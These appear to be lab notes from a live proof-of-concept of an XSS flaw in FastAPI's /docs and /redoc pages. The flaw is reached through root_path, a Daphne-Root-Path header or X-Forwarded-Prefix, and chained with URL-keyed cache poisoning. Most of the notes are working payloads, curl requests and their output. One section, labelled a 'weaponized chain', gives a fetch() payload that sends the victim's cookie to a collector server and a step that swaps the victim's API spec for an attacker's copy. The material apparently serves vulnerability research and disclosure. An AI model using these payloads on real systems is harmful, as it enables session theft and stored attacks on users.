# FastAPI root_path XSS — live demo run (2026-09-30)

Demo: `/tmp/fastapi-xss-demo` (fastapi 0.142.2, uvicorn, daphne 4.2.3, python venv).
Sink: `docs.py:168` (`url: '{openapi_url}'` inline JS), `docs.py:293`
(`<redoc spec-url="{openapi_url}">`), value from `applications.py:1160/1188`
(`req.scope["root_path"]`).

## Verified live (curl)

Part A — dynamic mount on uvicorn (:8901), URL-only, no headers:
```
GET /tenant-a/docs                          -> url: '/tenant-a/openapi.json',
GET /'+alert(document.cookie)+'/docs        -> url: '/'+alert(document.cookie)+'/openapi.json',
GET /%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E/redoc
    -> spec-url="/"><img src=x onerror=alert(document.cookie)>/openapi.json"></redoc>
```

Part B — Daphne 4.2.3 (:8902), plain app, client header:
```
GET /docs  Daphne-Root-Path: /'+alert(document.cookie)+'
    -> url: '/'+alert(document.cookie)+'/openapi.json',
GET /redoc Daphne-Root-Path: /"><img src=x onerror=alert(document.cookie)>
    -> spec-url="/"><img src=x onerror=alert(document.cookie)>/openapi.json"></redoc>
GET /whoami Daphne-Root-Path: /x            -> {"ok":true}   (header consumed, app cannot see it)
```

Part C — URL-keyed cache (:8903, forwards headers, caches by URL only) in front
of the Daphne app:
```
attacker: GET /docs + header  -> [cache] MISS stored (1062 bytes), payload present
victim:   GET /docs (no hdrs) -> [cache] HIT served from cache, same payload
```

## Verified in a real browser (headless Chromium via Playwright)

Part A:
- `http://127.0.0.1:8901/tenant-a/set-cookie` sets `session=SECRET-SESSION-ID`.
- `http://127.0.0.1:8901/'+alert(document.cookie)+'/docs`
  -> alert dialog `session=SECRET-SESSION-ID` fired; `document.cookie` =
  `session=SECRET-SESSION-ID`; payload present in the DOM.

Part C (stored XSS, no attacker headers in the victim request):
- `http://127.0.0.1:8903/set-cookie` then `http://127.0.0.1:8903/docs`
  -> cache HIT, alert `session=SECRET-SESSION-ID` fired, poisoned payload in DOM.

## Weaponized chain (verified, Playwright Chromium)

Payload used (closes and reopens the JS string, exfiltrates on load):

```
Daphne-Root-Path: /'+fetch("http://127.0.0.1:9000/steal/"+encodeURIComponent(document.cookie))+'x
```

1. `attacker_server.py 9000` started (collector).
2. `mini_cache.py 8903` poisoned with ONE attacker request carrying the payload
   (`curl -H "Daphne-Root-Path: $PAYLOAD" http://127.0.0.1:8903/docs`),
   cache log: `MISS /docs stored`.
3. Victim browser: `/set-cookie` then plain `http://127.0.0.1:8903/docs`
   (cache HIT, no attacker headers) -> payload executed.

Attacker collector log:

```
[attacker] GET /steal/session%3DSECRET-SESSION-ID
[attacker] GET /steal/session%3DSECRET-SESSION-ID
```

Spec hijack step: cache re-poisoned with `Daphne-Root-Path: http://127.0.0.1:9000`;
victim `/docs` then fetched `http://127.0.0.1:9000/openapi.json` (attacker log
`GET /openapi.json`) and the rendered page contained the attacker's
"Corporate API (attacker copy)" document. CORS `*` on the attacker spec allows
the cross-origin read.

## Minimal single-file chain — /tmp/main_temp.py (verified)

FastAPI + Langflow-pattern header middleware + URL-keyed cache in one file.
Poison both pages once, then a header-less client gets the payloads:

```
poison /docs  (X-Forwarded-Prefix: /'+alert(document.cookie)+'  ) -> x-cache: MISS
poison /redoc (X-Forwarded-Prefix: /"><img src=x onerror=alert(document.cookie)>)
                                                                  -> x-cache: MISS
victim /docs  (no headers) -> x-cache: HIT
    url: '/'+alert(document.cookie)+'/openapi.json',
    oauth2RedirectUrl: window.location.origin + '/'+alert(document.cookie)+'/docs/oauth2-redirect',
victim /redoc (no headers) -> x-cache: HIT
    <redoc spec-url="/"><img src=x onerror=alert(document.cookie)>/openapi.json"></redoc>
```

Browser (Playwright Chromium): /docs alert `session=SECRET-SESSION-ID`,
/redoc alert blocks navigation (img onerror fired). LAN IP for the
other-device step: 192.168.94.8 (server binds 0.0.0.0:8000).

## Notes

- Payloads with spaces (`<img src=x ...>`) must be percent-encoded for curl
  (`%20`); browsers encode automatically.
- Demo processes were stopped after verification; ports 8901-8903 free.
